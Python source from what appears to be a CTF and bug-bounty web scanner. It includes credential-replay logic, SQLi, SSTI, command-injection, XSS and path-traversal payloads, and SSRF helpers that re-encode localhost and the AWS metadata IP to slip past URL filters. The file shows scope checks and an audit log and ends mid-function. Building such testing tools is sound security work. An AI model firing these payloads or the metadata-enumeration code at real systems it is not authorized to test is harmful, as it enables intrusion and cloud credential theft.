                        "capabilities": trigger.get("capabilities", []),
                        "steps": steps,
                        "outcome": row["outcome"],
                        "provenance": provenance,
                        "confidence": row["confidence"],
                        "applied": row["applied"],
                        "worked": row["worked"],
                        "failed": row["failed"],
                        "created_at": row["created_at"],
                        "last_seen": row["last_seen"],
                    }
                )
            )
        return results

    def get_pattern(self, pattern_id: str) -> AttackPattern | None:
        """Fetch one stored pattern by id, or ``None`` if not present.

        Reconstructs an :class:`AttackPattern` from the row exactly as
        :meth:`match_patterns` does. Returns ``None`` for a missing id or a row
        whose JSON columns fail to parse (defensive, like the recall path).
        """
        from bugbounty_ctf.patterns import AttackPattern as _AttackPattern

        row = self.conn.execute(
            "SELECT * FROM patterns WHERE pattern_id = ?",
            (pattern_id,),
        ).fetchone()
        if row is None:
            return None
        try:
            trigger = json.loads(row["trigger_json"] or "{}")
            steps = json.loads(row["steps_json"] or "[]")
            provenance = json.loads(row["provenance_json"] or "[]")
        except (json.JSONDecodeError, ValueError):
            return None
        return _AttackPattern.from_dict(
            {
                "pattern_id": row["pattern_id"],
                "ports": trigger.get("ports", []),
                "tech": trigger.get("tech", []),
                "capabilities": trigger.get("capabilities", []),
                "steps": steps,
                "outcome": row["outcome"],
                "provenance": provenance,
                "confidence": row["confidence"],
                "applied": row["applied"],
                "worked": row["worked"],
                "failed": row["failed"],
                "created_at": row["created_at"],
                "last_seen": row["last_seen"],
            }
        )

    def bump_pattern_stats(
        self,
        pattern_id: str,
        *,
        applied: int = 0,
        worked: int = 0,
        failed: int = 0,
        now: str | None = None,
    ) -> None:
        """Add deltas to a pattern's applied/worked/failed and recompute confidence.

        The feedback half of the pattern-memory loop: a recalled pattern that was
        surfaced this run is scored (see SkillOrchestrator._score_pattern_feedback)
        and its counts nudged here. ``confidence`` is recomputed from the merged
        worked/failed via :func:`patterns.beta_confidence` so it self-corrects;
        ``last_seen`` refreshes only when ``now`` is given. No-op if ``pattern_id``
        is not present. ``beta_confidence`` is imported lazily to keep
        engine↔patterns acyclic (mirrors :meth:`save_pattern`).
        """
        from bugbounty_ctf.patterns import beta_confidence

        existing = self.conn.execute(
            "SELECT applied, worked, failed, last_seen FROM patterns WHERE pattern_id = ?",
            (pattern_id,),
        ).fetchone()
        if existing is None:
            return
        new_applied = existing["applied"] + applied
        new_worked = existing["worked"] + worked
        new_failed = existing["failed"] + failed
        new_last_seen = now if now is not None else existing["last_seen"]
        self.conn.execute(
            """UPDATE patterns SET applied = ?, worked = ?, failed = ?,
               confidence = ?, last_seen = ? WHERE pattern_id = ?""",
            (
                new_applied,
                new_worked,
                new_failed,
                beta_confidence(new_worked, new_failed),
                new_last_seen,
                pattern_id,
            ),
        )
        self.conn.commit()

    def prune_patterns(self, *, min_confidence: float = 0.15, min_applied: int = 5) -> int:
        """Delete patterns that have been tried enough yet keep failing.

        A pattern is only pruned once it has been ``applied`` at least
        ``min_applied`` times AND its confidence sits below ``min_confidence`` —
        so a low-confidence-but-rarely-tried pattern is kept (it hasn't earned
        deletion). Mirrors :meth:`prune_history`. Returns rows deleted.
        """
        cur = self.conn.execute(
            "DELETE FROM patterns WHERE confidence < ? AND applied >= ?",
            (min_confidence, min_applied),
        )
        self.conn.commit()
        return cur.rowcount

    def close(self) -> None:
        if self._conn is not None:
            self._conn.close()
            self._conn = None


class SecurityScanner:
    """Main security testing engine with SQLite persistence and request pacing."""

    def __init__(
        self,
        base_url: str,
        session: requests.Session | None = None,
        state_file: str | Path | None = None,
        *,
        timeout: float = 10.0,
        delay: float = 0.0,
        respect_waf: bool = True,
        db: ScannerDB | None = None,
        scope: ScopeGuard | None = None,
        audit_log: AuditLog | None = None,
        headers: dict[str, str] | None = None,
        verify: bool = False,
    ) -> None:
        """Initialize scanner state.

        TLS certificate verification defaults to verify=False for lab and CTF
        targets with self-signed certificates; pass verify=True for strict TLS.
        """
        self.base_url = base_url.rstrip("/")
        self.host = urlparse(base_url).hostname or "unknown"
        self.scope = scope
        self.audit_log = audit_log
        self.session = session or requests.Session()
        self.verify = verify
        self.session.verify = verify
        if not verify:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        if headers:
            self.session.headers.update(headers)
        self.state_file = str(state_file or _default_state_file(base_url))
        self.timeout = timeout
        self.delay = delay
        self.respect_waf = respect_waf
        self.waf_detected: bool = False
        self.rate_limit_detected: bool = False
        self.rate_limit_delay: float = 0.0
        self.findings: list[dict[str, Any]] = []
        self.test_history: list[dict[str, Any]] = []
        self.attack_surface: dict[str, Any] = {}
        self.defenses_detected: list[str] = []
        self.captured_credentials: list[dict[str, str]] = []
        self.captured_tokens: dict[str, str] = {}
        self.captured_cookies: dict[str, str] = {}
        self.db = db or ScannerDB()
        self.reload()

    @property
    def target_identity(self) -> str:
        return _scanner_target_identity(self.base_url, self.session.headers)

    @staticmethod
    def _finding_from_row(row: dict[str, Any]) -> dict[str, Any]:
        """Rebuild the in-memory finding dict shape from a ScannerDB row.

        The DB is the source of truth; this maps a stored row back onto the
        dict shape :meth:`_record_finding` produces so reloaded findings are
        indistinguishable from freshly recorded ones.
        """

        def _as_list(value: Any) -> list[Any]:
            if isinstance(value, list):
                return value
            try:
                parsed = json.loads(value) if isinstance(value, str) else []
            except (json.JSONDecodeError, ValueError):
                return []
            return parsed if isinstance(parsed, list) else []

        return {
            "type": row.get("vuln_type") or "potential_vulnerability",
            "endpoint": row.get("endpoint", ""),
            "method": row.get("method", ""),
            "payload": row.get("payload", ""),
            "indicators": _as_list(row.get("indicators")),
            "details": _as_list(row.get("details")),
            "source": row.get("source", ""),
            "timestamp": row.get("timestamp", ""),
        }

    def reload(self) -> None:
        """Re-read findings / attack surface / defenses from the ScannerDB.

        The ScannerDB is the single source of truth. This is what cross-agent
        feed-forward uses: a sub-agent persists findings through a scanner bound
        to the same DB path, and the orchestrator calls ``reload()`` to pick
        them up. The JSON ``state_file`` is never read back here — it is a
        derived snapshot artifact only (see :meth:`save_snapshot`).
        """
        rows = self.db.findings_for_host(self.target_identity, limit=10_000)
        # findings_for_host returns most-recent-first; restore chronological
        # order so the in-memory list matches record-time ordering.
        self.findings = [self._finding_from_row(r) for r in reversed(rows)]
        self.attack_surface = self.db.latest_surface_for_host(self.target_identity)
        self.defenses_detected = self.db.defenses_for_host(self.target_identity)
        self._restore_auth_material()

    def _restore_auth_material(self) -> None:
        for name in self.captured_cookies:
            self.session.cookies.pop(name, None)
        self.captured_credentials = []
        self.captured_tokens = {}
        self.captured_cookies = {}
        for row in self.db.load_auth_material(self.target_identity):
            kind = row["kind"]
            if kind == "credential":
                self.captured_credentials.append(
                    {"username": row["name"], "password": row["value"], "source": row["source"]}
                )
            elif kind == "token":
                self.captured_tokens[row["name"]] = row["value"]
            elif kind == "cookie":
                self.captured_cookies[row["name"]] = row["value"]
                self.session.cookies.set(row["name"], row["value"])

    def save_snapshot(self, path: str | None = None) -> str:
        """Write the current state to JSON as a human-readable ARTIFACT.

        This is derived output, never an authoritative reload source — the DB is
        the source of truth (see :meth:`reload`). Defaults to ``self.state_file``
        (the old per-target location). Returns the path written.
        """
        target = path or self.state_file
        state = {
            "base_url": self.base_url,
            "findings": self.findings[-500:],
            "test_history": self.test_history[-500:],
            "attack_surface": self.attack_surface,
            "defenses_detected": self.defenses_detected,
            "updated_at": datetime.now().isoformat(),
        }
        parent = os.path.dirname(target)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(target, "w") as f:
            json.dump(state, f, indent=2)
        return target

    def _effective_delay(self) -> float:
        """Compute effective delay, accounting for WAF and rate limits."""
        delay = self.delay
        if self.respect_waf and self.waf_detected:
            delay *= 2
        if self.rate_limit_detected and self.rate_limit_delay > 0:
            delay = max(delay, self.rate_limit_delay)
        return delay

    def adapt_to_defenses(self, defenses: dict[str, Any]) -> None:
        """Adapt scanner behavior based on detected defenses."""
        if defenses.get("waf"):
            self.waf_detected = True
            self.defenses_detected.append(defenses["waf"])

        rate_limit = defenses.get("rate_limit", "")
        if rate_limit and "429" in str(rate_limit):
            self.rate_limit_detected = True
            import re as _re

            match = _re.search(r"after (\d+) requests in ([\d.]+)s", str(rate_limit))
            if match:
                count = int(match.group(1))
                seconds = float(match.group(2))
                self.rate_limit_delay = (seconds / count) * 1.5

    def capture_credential(self, username: str, password: str, source: str = "") -> None:
        """Record a captured credential for reuse."""
        cred = {"username": username, "password": password, "source": source}
        self.db.save_auth_material(self.target_identity, "credential", username, password, source)
        if cred not in self.captured_credentials:
            self.captured_credentials.append(cred)
            print(f"[+] Credential captured: {username} (source: {source})")

    def capture_token(self, name: str, token: str, source: str = "") -> None:
        """Record a captured token (JWT, API key, session token)."""
        self.db.save_auth_material(self.target_identity, "token", name, token, source)
        self.captured_tokens[name] = token
        print(f"[+] Token captured: {name} (source: {source})")

    def capture_cookie(self, name: str, value: str, source: str = "") -> None:
        """Record a captured cookie and inject into session."""
        self.db.save_auth_material(self.target_identity, "cookie", name, value, source)
        self.captured_cookies[name] = value
        self.session.cookies.set(name, value)
        print(f"[+] Cookie captured: {name}")

    def try_captured_credentials(
        self, login_url: str, method: str = "POST"
    ) -> dict[str, Any] | None:
        """Try all captured credentials against a login endpoint."""
        username_fields = ["username", "user", "email", "login", "name"]
        password_fields = ["password", "pass", "passwd", "pwd"]

        for cred in self.captured_credentials:
            for uf in username_fields:
                for pf in password_fields:
                    data = {uf: cred["username"], pf: cred["password"]}
                    r = self._make_request(method, login_url, data=data)
                    if r.status_code in (200, 302) and "error" not in r.text.lower()[:200]:
                        print(f"[!] Login successful: {cred['username']} via {uf}/{pf}")
                        return {
                            "username": cred["username"],
                            "password": cred["password"],
                            "url": login_url,
                            "fields": (uf, pf),
                        }
        return None

    def _scope_check(self, method: str, url: str) -> None:
        """Scope-check ``url`` and record the decision to the audit log, if attached.

        Behaviour matches the previous inline ``self.scope.check(url)``: with no
        scope configured nothing is enforced, and an out-of-scope URL still raises
        :class:`OutOfScopeError`. The only addition is that the pass/fail/skip
        decision is appended to the audit trail when an :class:`AuditLog` is set.
        """
        if self.scope is None:
            self._record_scope(url, method, "skip")
            return
        try:
            self.scope.check(url)
        except OutOfScopeError:
            self._record_scope(url, method, "fail")
            raise
        self._record_scope(url, method, "pass")

    def _record_scope(self, url: str, method: str, decision: str) -> None:
        """Best-effort audit write; audit I/O or validation never breaks a scan."""
        if self.audit_log is None:
            return
        with contextlib.suppress(OSError, ValueError):
            self.audit_log.log_request(url, method, decision)

    def _make_request(self, method: str, url: str, **kwargs: Any) -> requests.Response:
        """Make HTTP request with timing, retry on transient failure, and pacing.

        If a :class:`ScopeGuard` is configured, the target is checked first and
        an out-of-scope URL raises :class:`OutOfScopeError` — a hard stop that
        is deliberately *not* caught here, so it surfaces to the caller rather
        than being masked as a failed request.
        """
        self._scope_check(method, url)

        request_kwargs = dict(kwargs)
        allow_redirects = request_kwargs.pop("allow_redirects", True)
        delay = self._effective_delay()

        for attempt in range(2):
            if delay > 0 and attempt == 0:
                time.sleep(delay)
            start = time.time()
            try:
                if self.scope is None or not allow_redirects:
                    response = self.session.request(
                        method,
                        url,
                        timeout=self.timeout,
                        allow_redirects=allow_redirects,
                        **request_kwargs,
                    )
                else:
                    response = self.session.request(
                        method,
                        url,
                        timeout=self.timeout,
                        allow_redirects=False,
                        **request_kwargs,
                    )
                    history: list[requests.Response] = []
                    while response.next is not None:
                        if len(history) >= self.session.max_redirects:
                            raise requests.exceptions.TooManyRedirects(
                                f"Exceeded {self.session.max_redirects} redirects.",
                                response=response,
                            )
                        next_request = response.next
                        redirect_url = next_request.url
                        if redirect_url is None:
                            raise requests.exceptions.MissingSchema("Redirect target is missing")
                        self._scope_check(method, redirect_url)
                        history.append(response)
                        redirect_settings = self.session.merge_environment_settings(
                            redirect_url,
                            request_kwargs.get("proxies") or {},
                            request_kwargs.get("stream"),
                            request_kwargs.get("verify"),
                            request_kwargs.get("cert"),
                        )
                        response = self.session.send(
                            next_request,
                            timeout=self.timeout,
                            allow_redirects=False,
                            **redirect_settings,
                        )
                    response.history = history
                response.response_time = time.time() - start
                return response
            except requests.exceptions.RequestException:
                if attempt == 0:
                    time.sleep(0.5)
                    continue
                response = requests.Response()
                response.status_code = 0
                response._content = b"Request failed: timeout or connection error"
                response.response_time = time.time() - start
                return response
        response = requests.Response()
        response.status_code = 0
        response._content = b"Request failed: retries exhausted"
        response.response_time = 0.0
        return response

    def get_baseline(self, method: str, url: str, **kwargs: Any) -> requests.Response:
        """Establish baseline response for an endpoint."""
        return self._make_request(method, url, **kwargs)

    def _record_finding(
        self,
        endpoint: str,
        method: str,
        payload: str,
        indicators: list[str],
        details: list[str],
        vuln_type: str = "",
        source: str = "",
    ) -> None:
        """Record a finding in the in-memory cache and the ScannerDB.

        The ScannerDB is the single source of truth; there is no JSON dual-write
        (the JSON ``state_file`` is a derived snapshot only — see
        :meth:`save_snapshot`). ``source`` is provenance — the methodology doc,
        phase, or tool that led to the finding — persisted alongside it.
        """
        finding = {
            "type": vuln_type or "potential_vulnerability",
            "endpoint": endpoint,
            "method": method,
            "payload": payload,
            "indicators": indicators,
            "details": details,
            "source": source,
            "timestamp": datetime.now().isoformat(),
        }
        self.findings.append(finding)
        self.db.save_finding(
            target_host=self.target_identity,
            endpoint=endpoint,
            vuln_type=vuln_type,
            method=method,
            payload=payload,
            confidence=0.8 if indicators else 0.0,
            indicators=indicators,
            details=details,
            source=source,
        )

    def test_payload(
        self,
        baseline: requests.Response,
        method: str,
        url: str,
        payload_data: dict[str, str] | str,
        payload_name: str = "test",
        vuln_type: str = "",
    ) -> dict[str, Any]:
        """Test a single payload against a baseline."""
        test_data: dict[str, str] | str
        if isinstance(payload_data, dict):
            test_data = {}
            for k, v in payload_data.items():
                if isinstance(v, str) and "{PAYLOAD}" in v:
                    test_data[k] = v.replace("{PAYLOAD}", payload_name)
                else:
                    test_data[k] = v
        else:
            test_data = payload_data

        kwargs: dict[str, Any] = {}
        if method.upper() in ("POST", "PUT", "PATCH"):
            kwargs["data"] = test_data
        else:
            kwargs["params"] = test_data

        response = self._make_request(method, url, **kwargs)
        diff = ResponseDiff(baseline, response)
        analysis = diff.analyze()

        return {
            "payload": payload_name,
            "method": method,
            "url": url,
            "baseline_status": baseline.status_code,
            "test_status": response.status_code,
            "analysis": analysis.to_dict(),
            "timestamp": datetime.now().isoformat(),
            "vuln_type": vuln_type,
        }

    def run_payload_set(
        self,
        baseline: requests.Response,
        method: str,
        url: str,
        payloads: dict[str, str],
        param_name: str = "input",
        vuln_type: str = "",
    ) -> list[dict[str, Any]]:
        """Run a set of payloads against an endpoint."""
        results: list[dict[str, Any]] = []

        for payload_name, payload_value in payloads.items():
            payload_data = {param_name: payload_value}
            result = self.test_payload(baseline, method, url, payload_data, payload_name, vuln_type)
            results.append(result)

            self.test_history.append(
                {
                    "endpoint": url,
                    "method": method,
                    "payload": payload_name,
                    "interesting": result["analysis"]["interesting"],
                    "indicators": result["analysis"]["indicators"],
                }
            )
            self.db.save_history(
                self.target_identity,
                url,
                method,
                payload_name,
                result["analysis"]["interesting"],
                result["analysis"]["indicators"],
            )

            if result["analysis"]["interesting"]:
                self._record_finding(
                    url,
                    method,
                    payload_name,
                    result["analysis"]["indicators"],
                    result["analysis"]["differences"],
                    vuln_type,
                )

        self.db.save_defenses(self.target_identity, self.defenses_detected)
        self.save_snapshot()
        return results

    def map_surface(self, start_url: str = "/") -> dict[str, Any]:
        """Map the attack surface by crawling and extracting inputs."""
        url = urljoin(self.base_url, start_url)

        response = self._make_request("GET", url)
        if response.status_code == 0:
            return {"error": "Could not reach target"}

        forms: list[dict[str, Any]] = []
        for form_match in _FORM_RE.finditer(response.text):
            form_tag = form_match.group(1)
            form_html = form_match.group(2)
            attrs = _extract_form_attrs(form_tag)
            method = attrs.get("method", "GET").upper()
            action = attrs.get("action", "")

            inputs: list[dict[str, str]] = []
            for inp in _INPUT_RE.finditer(form_html):
                inputs.append({"name": inp.group(1), "value": inp.group(2) or "", "type": "text"})
            for ta in _TEXTAREA_RE.finditer(form_html):
                inputs.append({"name": ta.group(1), "value": "", "type": "textarea"})
            for sel in _SELECT_RE.finditer(form_html):
                inputs.append({"name": sel.group(1), "value": "", "type": "select"})

            forms.append(
                {
                    "method": method,
                    "action": urljoin(self.base_url, action),
                    "inputs": inputs,
                }
            )

        links: list[str] = []
        for match in _HREF_RE.finditer(response.text):
            link = match.group(1)
            if link and not link.startswith(("#", "javascript:", "mailto:", "data:")):
                links.append(urljoin(self.base_url, link))

        surface = {
            "url": url,
            "status_code": response.status_code,
            "forms": forms,
            "links": list(set(links)),
            "headers": dict(response.headers),
            "tech_hints": self._detect_technology(response),
        }

        self.attack_surface[start_url] = surface
        self.db.save_surface(self.target_identity, start_url, surface)
        self.db.save_defenses(self.target_identity, self.defenses_detected)
        self.save_snapshot()
        return surface

    def _detect_technology(self, response: requests.Response) -> list[str]:
        """Detect technology stack from response."""
        hints: list[str] = []

        server = response.headers.get("Server", "")
        if "werkzeug" in server.lower():
            hints.append("Flask/Python (Werkzeug)")
        if "nginx" in server.lower():
            hints.append("nginx")
        if "apache" in server.lower():
            hints.append("Apache")

        x_powered = response.headers.get("X-Powered-By", "")
        if x_powered:
            hints.append(f"X-Powered-By: {x_powered}")

        set_cookie = response.headers.get("Set-Cookie", "")
        if "sessionid=" in set_cookie.lower():
            hints.append("Django/Python")
        if "PHPSESSID" in set_cookie:
            hints.append("PHP")
        if "connect.sid" in set_cookie:
            hints.append("Node.js/Express")

        if "jinja" in response.text.lower():
            hints.append("Jinja2 template engine")

        return hints

    def scan_endpoint(
        self,
        url: str,
        method: str = "GET",
        params: dict[str, str] | None = None,
        data: dict[str, str] | None = None,
    ) -> dict[str, list[TestResult]]:
        """Auto-run all relevant tests against an endpoint in priority order.

        Detects defenses, then runs SQLi, SSTI, CMDi, XSS, and path traversal.
        Each finding is confirmed via a second-pass check for vuln-specific
        content patterns, eliminating false positives from generic response changes.
        """

        results: dict[str, list[TestResult]] = {}

        if not self.attack_surface:
            self.map_surface("/")

        if not self.defenses_detected:
            from bugbounty_ctf.advanced_tests import detect_defenses

            defenses = detect_defenses(self.base_url, scanner=self)
            if defenses.get("waf"):
                self.waf_detected = True

        scan_data = data if method.upper() in ("POST", "PUT", "PATCH") else params
        prepared = _scan_prepare(url, method, scan_data, None, None)
        baseline = _scan_execute(url, method, prepared, self)
        baseline_text = baseline.text

        test_param = prepared["test_param"]

        if test_param:
            test_configs = [
                (
                    "sqli",
                    {
                        "single_quote": "'",
                        "or_true": "' OR 1=1--",
                        "or_true_alt": "' OR '1'='1",
                        "admin_comment": "admin'--",
                        "union_null": "' UNION SELECT NULL--",
                    },
                ),
                ("ssti", {"ssti_basic": "{{7*7}}", "ssti_math49": "{{7*49}}"}),
                ("cmdi", {"semicolon_id": "; id", "pipe_id": "| id", "dollar_id": "$(id)"}),
                (
                    "xss",
                    {
                        "script_tag": "<script>alert(1)</script>",
                        "svg_onload": "<svg onload=alert(1)>",
                    },
                ),
                ("lfi", {"passwd": "../../../etc/passwd", "hosts": "../../../../../../etc/hosts"}),
            ]

            for vuln_type, payloads in test_configs:
                confirmed_results: list[TestResult] = []
                for payload_name, payload_value in payloads.items():
                    payload_data = {test_param: payload_value}
                    raw = self.test_payload(
                        baseline, method, url, payload_data, payload_name, vuln_type
                    )
                    tr = self._to_test_result(raw, vuln_type)

                    if tr.interesting:
                        payload_prepared = _scan_prepare(
                            url,
                            method,
                            {test_param: payload_value},
                            None,
                            None,
                        )
                        response = _scan_execute(url, method, payload_prepared, self)
                        tr = _scan_analyze(
                            url,
                            response,
                            {
                                "scanner": self,
                                "method": method,
                                "raw": raw,
                                "baseline_text": baseline_text,
                                "payload_value": payload_value,
                                "vuln_type": vuln_type,
                            },
                        )
                    confirmed_results.append(tr)
                results[vuln_type] = confirmed_results

        return results

    @staticmethod
    def _to_test_result(raw: dict[str, Any], vuln_type: str) -> TestResult:
        """Convert a raw payload result dict into a TestResult dataclass."""
        analysis = raw.get("analysis", {})
        return TestResult(
            payload=raw.get("payload", ""),
            confirmed=analysis.get("interesting", False),
            interesting=analysis.get("interesting", False),
            indicators=analysis.get("indicators", []),
            details=analysis.get("differences", []),
            status_code=raw.get("test_status", 0),
            response_length=abs(analysis.get("length_diff", 0)),
            vuln_type=vuln_type,
        )

    def get_summary(self) -> dict[str, Any]:
        """Get testing summary."""
        return {
            "target": self.base_url,
            "host": self.host,
            "findings_count": len(self.findings),
            "tests_run": len(self.test_history),
            "interesting_tests": sum(1 for t in self.test_history if t.get("interesting")),
            "defenses_detected": self.defenses_detected,
            "waf_detected": self.waf_detected,
            "findings": self.findings,
            "last_updated": datetime.now().isoformat(),
        }


def derive_base_url(url: str) -> str:
    """Derive a base URL from a full URL, preserving the scheme and host.

    Fixes the old `url.rsplit('/', 1)[0]` approach which broke on nested paths:
        http://target/api/v1/login → http://target/api/v1  (wrong)
        This function → http://target                    (correct)
    """
    parsed = urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        raise ValueError(f"Invalid URL (need scheme+host): {url}")
    return f"{parsed.scheme}://{parsed.netloc}"


# ============================================================================
# Vulnerability Confirmation Patterns
# ============================================================================

CONFIRMATION_PATTERNS: dict[str, list[str]] = {
    "sqli": [
        r"SQL syntax",
        r"You have an error in your SQL",
        r"sqlite3\.OperationalError",
        r"pymysql\.err",
        r"psycopg2\.ProgrammingError",
        r"ORA-\d+",
        r"unterminated.*string",
        r"near.*\".*\": syntax error",
        r"mysql_fetch",
        r"SQLSTATE\[",
        r"pg_query\(",
        r"unclosed.*quotation",
        r"Doctrine.*ORMException",
    ],
    "ssti": [
        r"\b49\b",
        r"\b343\b",
        r"{{.*}}.*\d{2,}",
    ],
    "cmdi": [
        r"uid=\d+",
        r"gid=\d+",
        r"groups=\d+",
        r"root:x:0:0",
        r"\/bin\/(bash|sh|zsh)",
        r"daemon:x:\d+",
    ],
    "xss": [
        r"<script>alert\(1\)</script>",
        r"<svg onload=alert\(1\)>",
        r"<img src=x onerror=",
        r"<details open ontoggle=",
    ],
    "lfi": [
        r"root:x:0:0",
        r"daemon:x:1:",
        r"bin:x:2:",
        r"\/bin\/bash",
        r"\/usr\/sbin\/nologin",
        r"127\.0\.0\.1.*localhost",
    ],
    "ssrf": [
        r"AccessKeyId",
        r"SecretAccessKey",
        r"Token",
        r"ami-id",
        r"instance-id",
        r"iam\/security-credentials",
        r"169\.254\.169\.254",
        r"meta-data",
    ],
}


def confirm_vulnerability(
    vuln_type: str,
    response_text: str,
    baseline_text: str,
    payload: str = "",
) -> bool:
    """Second-pass confirmation: check for vuln-specific content in the response.

    Returns True only if the response contains patterns specific to the
    vulnerability class that were NOT in the baseline. This prevents
    false positives where any response change is reported as a vuln.
    """
    patterns = CONFIRMATION_PATTERNS.get(vuln_type, [])
    if not patterns:
        return True

    for pattern in patterns:
        in_response = bool(re.search(pattern, response_text, re.IGNORECASE))
        in_baseline = bool(re.search(pattern, baseline_text, re.IGNORECASE))
        if in_response and not in_baseline:
            return True

    if vuln_type == "ssti" and payload:
        if "7*7" in payload and "49" in response_text and "49" not in baseline_text:
            return True
        if "7*49" in payload and "343" in response_text and "343" not in baseline_text:
            return True

    return (
        vuln_type == "xss"
        and bool(payload)
        and payload in response_text
        and payload not in baseline_text
    )


# ============================================================================
# IP Encoding Bypass Utilities
# ============================================================================


def ip_to_octal(ip: str) -> str:
    """Convert IP to octal format (127.0.0.1 → 0177.0.0.1).

    Each octet keeps a leading ``0`` so parsers recognise it as octal — without
    it ``127`` becomes ``177`` (a different, decimal address) instead of ``0177``.
    """
    parts = ip.split(".")
    return ".".join(f"0{oct(int(p))[2:]}" for p in parts)


def ip_to_decimal(ip: str) -> str:
    """Convert IP to decimal format (127.0.0.1 → 2130706433)."""
    parts = ip.split(".")
    return str(sum(int(p) << (8 * (3 - i)) for i, p in enumerate(parts)))


def ip_to_hex(ip: str) -> str:
    """Convert IP to hex format (127.0.0.1 → 0x7f000001)."""
    parts = ip.split(".")
    return "0x" + "".join(f"{int(p):02x}" for p in parts)


def generate_ssrf_bypass_ips(ip: str = "127.0.0.1") -> list[str]:
    """Generate IP encodings that may bypass SSRF filters.

    Returns multiple representations of the same IP:
    - Original: 127.0.0.1
    - Octal: 0177.0.0.1
    - Decimal: 2130706433
    - Hex: 0x7f000001
    - Short: 127.1 (only for 127.0.0.1)
    - Zero: 0 (binds to localhost on Linux)
    """
    bypasses = [ip, ip_to_octal(ip), ip_to_decimal(ip), ip_to_hex(ip)]
    if ip == "127.0.0.1":
        bypasses.extend(["127.1", "0", "0.0.0.0"])
    return bypasses


# Canonical AWS metadata service IP — universal, not target-specific. Encodings
# are derived generically (decimal/octal/hex) rather than hardcoding a magic int.
AWS_METADATA_IP = "169.254.169.254"

# Generic SSRF URL-filter markers and URL-accepting parameter-name hints. These
# describe the vulnerability class, not any one target.
_SSRF_BLOCK_MARKERS = (
    "security policy",
    "blocked",
    "forbidden",
    "not allowed",
    "denied",
    "internal resource",
)
_URL_PARAM_HINTS = (
    "url",
    "uri",
    "link",
    "fetch",
    "src",
    "source",
    "target",
    "dest",
    "destination",
    "host",
    "path",
    "callback",
    "redirect",
    "proxy",
    "feed",
    "image",
    "load",
)


def find_ssrf_endpoints(
    scanner: SecurityScanner, start_paths: list[str] | None = None
) -> list[dict[str, str]]:
    """Discover candidate SSRF sinks by mapping the surface (no assumptions).

    Returns ``[{"url", "method", "param"}]`` for every form input that looks
    like it accepts a URL (``type=url`` or a URL-ish parameter name). This is
    how the AWS/SSRF helpers locate their sink instead of hardcoding one.
    """
    found: list[dict[str, str]] = []
    seen: set[tuple[str, str, str]] = set()
    for path in start_paths or ["/"]:
        surface = scanner.attack_surface.get(path) or scanner.map_surface(path)
        for form in surface.get("forms", []):
            action = form.get("action") or urljoin(scanner.base_url, path)
            method = (form.get("method") or "GET").upper()
            for inp in form.get("inputs", []):
                name = inp.get("name") or ""
                itype = inp.get("type") or ""
                if itype == "url" or any(h in name.lower() for h in _URL_PARAM_HINTS):
                    key = (action, method, name)
                    if key not in seen:
                        seen.add(key)
                        found.append({"url": action, "method": method, "param": name})
    return found


def _resolve_ssrf_sink(
    scanner: SecurityScanner, ssrf_endpoint: str | None, ssrf_param: str | None
) -> tuple[str | None, str]:
    """Return (endpoint, param), discovering them from the surface if not given."""
    if ssrf_endpoint:
        return ssrf_endpoint, ssrf_param or "url"
    candidates = find_ssrf_endpoints(scanner)
    if candidates:
        return candidates[0]["url"], ssrf_param or candidates[0]["param"]
    return None, ssrf_param or "url"


def _ssrf_fetch(
    scanner: SecurityScanner,
    ssrf_endpoint: str,
    ssrf_param: str,
    target_url: str,
    *,
    url_suffix: str = "",
    method: str = "POST",
) -> requests.Response:
    """Send one SSRF request: deliver ``target_url`` (+optional suffix) via the sink."""
    data = {ssrf_param: target_url + url_suffix}
    if method.upper() in ("POST", "PUT", "PATCH"):
        return scanner._make_request(method, ssrf_endpoint, data=data)
    return scanner._make_request(method, ssrf_endpoint, params=data)


def _ssrf_body(text: str) -> str:
    """Best-effort extraction of the fetched content from an SSRF response.

    Prefers a ``<pre>`` block (common for preview/echo sinks); otherwise returns
    the response text. HTML entities are unescaped. No target-specific markers.
    """
    match = re.search(r"<pre[^>]*>(.*?)</pre>", text, re.DOTALL | re.IGNORECASE)
    raw = match.group(1) if match else text
    for a, b in (("&lt;", "<"), ("&gt;", ">"), ("&amp;", "&"), ("&#34;", '"'), ("&#39;", "'")):
        raw = raw.replace(a, b)
    return raw


def _ssrf_blocked(text: str) -> bool:
    low = text.lower()
    return any(marker in low for marker in _SSRF_BLOCK_MARKERS)


def bypass_url_filter(
    url: str,
    scanner: SecurityScanner,
    *,
    ssrf_endpoint: str | None = None,
    ssrf_param: str | None = None,
    url_suffix: str = "",
    blocked_substrings: list[str] | None = None,
) -> str | None:
    """Try to bypass an SSRF URL filter by re-encoding the host.

    Generic: the SSRF sink is discovered (or passed via ``ssrf_endpoint``),
    ``url_suffix`` is supplied by the caller only if the target's filter needs
    one (e.g. an extension requirement) — nothing is assumed about the target.

    Returns the first URL that the sink fetches without a block, or None.
    """
    if blocked_substrings is None:
        blocked_substrings = ["127.0.0.1", "localhost", "internal", "metadata"]

    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
    if not endpoint:
        return None

    parsed = urlparse(url)
    bypass_ips = generate_ssrf_bypass_ips("127.0.0.1")
    bypass_ips.extend(generate_ssrf_bypass_ips(AWS_METADATA_IP))

    for bypass_ip in bypass_ips:
        if bypass_ip in blocked_substrings:
            continue
        test_url = url.replace(parsed.hostname or "", bypass_ip)
        if any(bs in test_url.lower() for bs in blocked_substrings):
            continue
        r = _ssrf_fetch(scanner, endpoint, param, test_url, url_suffix=url_suffix)
        if not _ssrf_blocked(r.text):
            scanner._record_finding(
                endpoint=endpoint,
                method="POST",
                payload=test_url + url_suffix,
                indicators=["ssrf", "filter_bypass"],
                details=[f"SSRF filter bypassed via {test_url}{url_suffix}"],
                vuln_type="ssrf_filter_bypass",
                source="bypass_url_filter",
            )
            return test_url + url_suffix

    return None


# ============================================================================
# AWS Metadata Service Enumeration (via a discovered SSRF sink)
# ============================================================================


def enumerate_aws_metadata(
    scanner: SecurityScanner,
    *,
    ssrf_endpoint: str | None = None,
    ssrf_param: str | None = None,
    url_suffix: str = "",
    metadata_ip: str | None = None,
    base_path: str = "/latest/meta-data/",
    max_depth: int = 4,
) -> dict[str, str]:
    """Recursively enumerate the AWS metadata service through an SSRF sink.

    The sink is discovered from the surface (or passed in); ``metadata_ip``
    defaults to a decimal-encoded ``169.254.169.254`` (a generic IP-filter
    bypass), and ``url_suffix`` is only used if the caller found the filter
    needs one. Returns a dict of metadata path → content.
    """
